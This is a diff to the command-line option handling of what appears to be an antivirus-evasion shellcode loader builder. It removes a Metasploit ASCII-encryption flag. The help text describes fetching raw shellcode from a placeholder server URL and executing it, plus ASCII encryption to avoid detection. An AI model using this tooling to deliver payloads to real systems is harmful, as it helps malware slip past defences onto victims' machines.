@@ -28,8 +28,7 @@ int main (int argc, char **argv)
 	char *wvalue = NULL;
 	int hflag = 0;	
 	int Xflag = 0;
-	int Eflag = 0;
-	int Aflag = 0;	
+	int Eflag = 0;	
 	char *dvalue = NULL;
 
 	int index;
@@ -67,10 +66,7 @@ int main (int argc, char **argv)
 				break;
 			case 'E':
 				Eflag = 1;
-				break;
-			case 'A':
-				Aflag = 1;
-				break;			
+				break;					
 			case 'p':
 				print_debug = 1;
 				break;
@@ -193,11 +189,7 @@ int main (int argc, char **argv)
 	
 	//write ENCRYPT to defs.h
 	if(Eflag)
-		fprintf (file_def, "#define ENCRYPT\n");
-
-	//write ASCIIMSF to defs.h
-	if(Aflag)
-		fprintf (file_def, "#define ASCIIMSF\n");	
+		fprintf (file_def, "#define ENCRYPT\n");	
 
 	if(dvalue)
 	{
@@ -229,8 +221,7 @@ void print_help()
 	printf("      for executing the raw shellcode after downloading\n");
 	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
-	printf("   Can be used with -l\n");
-	//printf("-A use metasploits ASCII encryption, usage is like -E\n");		
+	printf("   Can be used with -l\n");	
 	printf("-X compile for 64 bit\n");
 	printf("-p print debug information\n");	
 	printf("-h help\n\n");
